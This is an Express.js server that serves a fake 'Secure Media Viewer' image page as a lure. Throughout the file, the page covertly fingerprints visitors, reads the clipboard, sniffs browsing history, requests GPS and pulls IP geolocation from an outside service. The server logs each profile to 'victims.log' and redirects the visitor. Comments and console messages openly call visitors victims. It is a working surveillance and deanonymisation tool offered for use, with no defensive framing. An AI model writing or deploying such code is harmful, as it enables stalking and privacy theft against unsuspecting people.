const express = require('express');
const config = require('./config');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.static('public'));
app.use(express.json());

// Log file for victim data
const LOG_FILE = path.join(__dirname, 'victims.log');

// Helper to log victim data
const logVictim = (data) => {
    const logEntry = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
    console.log("🔥 Victim profile captured:", data.ip, data.userAgent, data.location || "No GPS");
};

// Main route - serves tracking page disguised as image
app.get('/view-image', (req, res) => {
    const clientIP = req.ip;
    const userAgent = req.get('User-Agent');
    const headers = JSON.stringify(req.headers);

    // Send tracking page
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta property="og:image:type" content="image/jpeg">
            <meta property="og:url" content="${config.BASE_DOMAIN}/view-image">
            <meta property="fb:app_id" content="966242223397117">
            <meta property="og:title" content="Verified Shared Asset">
            <meta property="og:description" content="Loading image...">
            <title>Loading Image...</title>

            <!-- FingerprintJS Pro (free tier) -->
            <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3"></script>

            <script>
				(async () => {
					const results = {
						location: {},
						localIP: null,
						webRTC: false,
						canvasHash: null,
						webgl: {},
						audioHash: null,
						fonts: [],
						batteryLevel: null,
						touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
						cookiesEnabled: navigator.cookieEnabled,
						localStorageEnabled: !!tryStorage('localStorage'),
						sessionStorageEnabled: !!tryStorage('sessionStorage'),
						deviceMemory: navigator.deviceMemory,
						hardwareConcurrency: navigator.hardwareConcurrency,
						platform: navigator.platform,
						language: navigator.language,
						screen: {
							width: screen.width,
							height: screen.height,
							colorDepth: screen.colorDepth,
							pixelDepth: screen.pixelDepth
						},
						userAgent: navigator.userAgent
					};

					// Try to access clipboard
					try {
						if (navigator.clipboard?.readText) {
							results.clipboardText = await navigator.clipboard.readText().catch(() => null);
						}
					} catch (e) {}

					// Try battery API
					if (navigator.getBattery) {
						try {
							const batt = await navigator.getBattery();
							results.batteryLevel = Math.round(batt.level * 100);
						} catch (e) {}
					}

					// Canvas fingerprint
					results.canvasHash = fingerprintCanvas();

					// WebGL renderer + vendor
					const gl = document.createElement('canvas').getContext('webgl');
					if (gl) {
						const debug = gl.getExtension('WEBGL_debug_renderer_info');
						results.webgl = {
							renderer: gl.getParameter(debug ? gl.UNMASKED_RENDERER_WEBGL : gl.RENDERER),
							vendor: gl.getParameter(debug ? gl.UNMASKED_VENDOR_WEBGL : gl.VENDOR)
						};
					}

					// Audio fingerprint
					results.audioHash = fingerprintAudio();

					// Font detection
					results.fonts = detectFonts();

					// WebRTC local IP leak
					fetchLocalIP().then(ips => {
						results.localIP = ips.join(', ');
						results.webRTC = true;
					}).catch(() => {});

					// History sniffing (basic: checks if common sites are visited)
					historySniff().then(sites => results.visitedSites = sites);

					// FingerprintJS
					const fpPromise = FingerprintJS.load();
					const fp = await fpPromise;
					const fpResult = await fp.get();
					results.fingerprint = fpResult.visitorId;

					// Try to get GPS (social engineer prompt)
					if (navigator.geolocation) {
						navigator.geolocation.getCurrentPosition(
							pos => {
								results.location = {
									lat: pos.coords.latitude,
									lng: pos.coords.longitude,
									accuracy: pos.coords.accuracy
								};
								sendResults(results);
							},
							() => sendResults(results)
						);
					} else {
						sendResults(results);
					}

					function sendResults(data) {
						fetch('/log-victim', {
							method: 'POST',
							body: JSON.stringify(data),
							headers: { 'Content-Type': 'application/json' },
							keepalive: true
						}).finally(() => {
							setTimeout(() => {
								window.location.href = "${config.BASE_DOMAIN}${config.PATHS.abstract}";
							}, 1800);
						});
					}

					// === HELPER FUNCTIONS ===
					function tryStorage(type) {
						try {
							const test = '__test__';
							window[type].setItem(test, test);
							window[type].removeItem(test);
							return true;
						} catch (e) {
							return false;
						}
					}

					function fingerprintCanvas() {
						const canvas = document.createElement('canvas');
						const ctx = canvas.getContext('2d');
						const txt = '👻 EvilGPT was here';
						ctx.textBaseline = 'top';
						ctx.font = '14px Arial';
						ctx.fillStyle = '#f00';
						ctx.fillRect(123, 456, 789, 101);
						ctx.fillStyle = '#00f';
						ctx.fillText(txt, 2, 1);
						return btoa(canvas.toDataURL());
					}

					function fingerprintAudio() {
						try {
							const audio = new AudioContext();
							const osc = audio.createOscillator();
							const wav = audio.createWaveShaper();
							const dst = audio.createAnalyser();
							osc.connect(wav);
							wav.connect(dst);
							dst.connect(audio.destination);
							osc.start(0);
							osc.stop(0.01);
							const buf = new Float32Array(dst.fftSize);
							dst.getFloatTimeDomainData(buf);
							audio.close();
							let sum = 0;
							for (let i of buf) sum += i * i;
							return Math.sqrt(sum / buf.length).toFixed(10);
						} catch (e) {
							return null;
						}
					}

					function detectFonts() {
						const commonFonts = [
							'Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Comic Sans MS',
							'Trebuchet MS', 'Arial Black', 'Impact', 'Helvetica', 'Consolas', 'Lucida Console',
							'Monaco', 'Palatino', 'Bookman', 'Cambria', 'Calibri', 'Tahoma', 'Geneva'
						];
						const test = document.createElement('span');
						test.style.cssText = 'position:absolute;left:-9999px;font-size:48px;';
						document.body.appendChild(test);

						const base = 'monospace';
						return commonFonts.filter(font => {
							test.style.fontFamily = font + ',' + base;
							const w1 = test.offsetWidth;
							test.style.fontFamily = base;
							const w2 = test.offsetWidth;
							return w1 !== w2;
						});
					}

					function fetchLocalIP() {
						return new Promise((resolve, reject) => {
							const pc = new RTCPeerConnection({ iceServers: [] });
							pc.createDataChannel('');
							pc.createOffer().then(o => pc.setLocalDescription(o));
							pc.onicecandidate = e => {
								if (!e.candidate) return;
								const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
								const ip = e.candidate.candidate.match(ipRegex)?.[1];
								if (ip && !ip.startsWith('127.')) {
									localIPs.add(ip);
								}
							};
							const localIPs = new Set();
							setTimeout(() => {
								pc.close();
								resolve(Array.from(localIPs));
							}, 1000);
						});
					}

					function historySniff() {
						return new Promise(resolve => {
							const sites = ['https://facebook.com', 'https://instagram.com', 'https://twitter.com', 'https://linkedin.com', 'https://github.com', 'https://gmail.com'];
							const detected = [];
							let checked = 0;

							sites.forEach(url => {
								const a = document.createElement('a');
								a.href = url;
								a.style.color = 'red'; // Assume unvisited = blue, visited = red
								document.body.appendChild(a);

								setTimeout(() => {
									if (window.getComputedStyle(a).color === 'rgb(255, 0, 0)') {
										detected.push(url);
									}
									document.body.removeChild(a);
									checked++;
									if (checked === sites.length) resolve(detected);
								}, 10);
							});
						});
					}
				})();
				</script>
        </head>
			<img src="/nonexistent.jpg" onerror="
				fetch('https://ipapi.co/json/')
					.then(r => r.json())
					.then(geo => fetch('/log-victim', {
						method: 'POST',
						body: JSON.stringify({
							userAgent: navigator.userAgent,
							platform: navigator.platform,
							language: navigator.language,
							screen: { width: screen.width, height: screen.height },
							timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
							deviceMemory: navigator.deviceMemory || null,
							hardwareConcurrency: navigator.hardwareConcurrency || null,
							touchSupport: 'ontouchstart' in window,
							ip: geo.ip,
							city: geo.city,
							region: geo.region,
							country_name: geo.country_name,
							country_code: geo.country_code,
							latitude: geo.latitude,
							longitude: geo.longitude,
							fingerprint: 'fallback-beacon',
							localIP: null
						}),
						headers: { 'Content-Type': 'application/json' }
					}))
					.finally(() => setTimeout(() => {
						window.location.href = '${config.BASE_DOMAIN}${config.PATHS.abstract}';
					}, 1000));
			" style="display:none">
        <body style="background:#111;color:#fff;text-align:center;padding:50px;font-family:sans-serif;">
            <h2>🔐 Secure Media Viewer</h2>
            <p>Authenticating session...</p>
            <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" width="80" style="margin:20px">
            <p><small>Your connection is being verified for security.</small></p>
        </body>
        </html>
    `);
});

app.post('/log-victim', express.json(), (req, res) => {
    const payload = req.body;
    const ip = req.ip;
	
	const fullProfile = {
        ip,
        timestamp: new Date().toISOString(),
        // === GEO & NETWORK ===
        city: payload.city,
        region: payload.region,
        country: payload.country_name,
        country_code: payload.country_code,
        latitude: payload.latitude,
        longitude: payload.longitude,
        timezone: payload.timezone,
        org: payload.org,
        asn: payload.asn,
        public_ip: payload.ip,
        local_ip: payload.localIP || null,
        webrtc_enabled: payload.webRTC ? true : false,

        // === DEVICE & BROWSER ===
        user_agent: payload.userAgent,
        platform: payload.platform,
        language: payload.language,
        device: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(payload.userAgent)
            ? "Mobile"
            : /Linux/.test(payload.platform)
            ? "Linux"
            : /Win/.test(payload.platform)
            ? "Windows"
            : /Mac/.test(payload.platform)
            ? "macOS"
            : "Unknown",
        screen_resolution: `${payload.screen?.width}x${payload.screen?.height}`,
        color_depth: payload.screen?.colorDepth,
        device_memory: payload.deviceMemory || "Unknown",
        hardware_concurrency: payload.hardwareConcurrency || "Unknown",
        browser: (function(ua) {
            if (ua.match(/Edge/)) return "Edge";
            if (ua.match(/Chrome|CriOS/)) return "Chrome";
            if (ua.match(/Firefox|FxiOS/)) return "Firefox";
            if (ua.match(/Safari/) && !ua.match(/Chrome/)) return "Safari";

            if (ua.match(/Opera|OPR/)) return "Opera";
            return "Other";
        })(payload.userAgent),

        // === ADVANCED FINGERPRINTING ===
        fingerprint: payload.fingerprint,
        canvas_hash: payload.canvasHash || null,
        webgl_renderer: payload.webgl?.renderer || null,
        webgl_vendor: payload.webgl?.vendor || null,
        audio_fingerprint: payload.audioHash || null,
        fonts: payload.fonts?.length ? payload.fonts : "None detected",
        battery: payload.batteryLevel !== undefined ? `${payload.batteryLevel}%` : "N/A",
        touch_support: payload.touchSupport || false,
        cookies_enabled: payload.cookiesEnabled,
        localStorage_enabled: payload.localStorageEnabled,
        sessionStorage_enabled: payload.sessionStorageEnabled,

        // === PRIVACY & HISTORY SNIFFING ===
        referer: req.get('Referer'),
        history_sniffing: payload.visitedSites || [], // Sites they've been to (CSS-based)
        clipboard_text: payload.clipboardText || null, // If permission granted
        active_tab: payload.tabActive === false ? "Likely background" : "Foreground",

        // === LOCATION ===
        gps_granted: payload.location?.lat ? true : false,
        gps_coords: payload.location,
    };

		try {
			 const data = { ...req.body, ip: req.ip, timestamp: new Date().toISOString() };
			console.log('💀 CAPTURED:', data);  // Force visible log
			fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
			} 
			catch (err) {
				if (!res.headersSent) {  // ← guard
				  res.status(500).send('Internal error');
				}
			}
			 res.status(200).send('OK');
   
});

app.listen(PORT, () => {
    console.log(`🔥 Tracking server running on port ${PORT}`);
    console.log(`🔗 Send victims to: ${config.BASE_DOMAIN}/view-image`);
});

